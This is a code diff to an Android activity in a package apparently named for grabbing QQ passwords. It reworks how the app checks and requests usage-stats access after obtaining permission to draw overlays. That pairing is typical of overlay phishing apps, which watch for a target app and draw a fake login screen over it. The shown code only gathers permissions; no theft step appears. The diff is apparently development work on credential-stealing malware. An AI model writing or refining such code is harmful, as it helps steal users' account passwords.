@@ -3,6 +3,8 @@ package com.android.grabqqpwd;
 import android.Manifest;
 import android.annotation.TargetApi;
 import android.app.Activity;
+import android.app.AppOpsManager;
+import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.net.Uri;
@@ -52,8 +54,11 @@ public class MainActivity extends Activity {
         super.onActivityResult(requestCode, resultCode, data);
         if (requestCode == 1) {
             if (Settings.canDrawOverlays(this)) {
-                if (ContextCompat.checkSelfPermission(this, Manifest.permission.PACKAGE_USAGE_STATS) !=
-                        PackageManager.PERMISSION_GRANTED){
+                AppOpsManager appOps = (AppOpsManager) getSystemService(Context.APP_OPS_SERVICE);
+                int mode = appOps.checkOpNoThrow("android:get_usage_stats",
+                        android.os.Process.myUid(), getPackageName());
+                boolean granted = mode == AppOpsManager.MODE_ALLOWED;
+                if (!granted){
                     Intent intent = new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS);
                     startActivity(intent);
                 }else {
